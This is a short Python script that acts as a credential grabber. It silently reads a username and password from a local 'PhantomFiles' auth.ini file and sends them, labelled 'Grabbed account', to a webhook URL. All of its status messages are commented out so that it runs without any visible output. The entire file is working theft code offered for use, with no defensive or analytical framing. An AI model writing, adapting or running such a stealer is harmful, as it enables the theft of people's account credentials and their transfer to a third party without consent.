import configparser, requests, time

WEBHOOK_URL = "Your webhook url here"

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

config = configparser.ConfigParser()
inifile = "C:\\PhantomFiles\\auth.ini"

try:
    config.read(inifile)
    # print(f"[{bcolors.OKBLUE}INFO{bcolors.ENDC}] auth.ini loaded")
except Exception as e:
    # print(f"[{bcolors.FAIL}ERROR{bcolors.ENDC}] {e}")
    exit()

try:
    username = config.get('auth', 'login')
    password = config.get('auth', 'password')

    if not username.startswith("pxau"):
        # print(f"[{bcolors.FAIL}FORMAT{bcolors.ENDC}] Invalid username '{username}', does not start with 'pxau'\n")
        exit()

    # print(f"[{bcolors.OKGREEN}GRABBED{bcolors.ENDC}] {username}:{password}")

    data = {
        "content": f"**Grabbed account**:\n[{time.strftime("%Y-%m-%d %H:%M:%S")}]\n```\nUsername: {username}\nPassowrd: {password}```\n\n"
    }

    requests.post(WEBHOOK_URL, data=data)

except Exception as e:
    # print(f"[{bcolors.FAIL}ERROR{bcolors.ENDC}] {e}")
    exit()
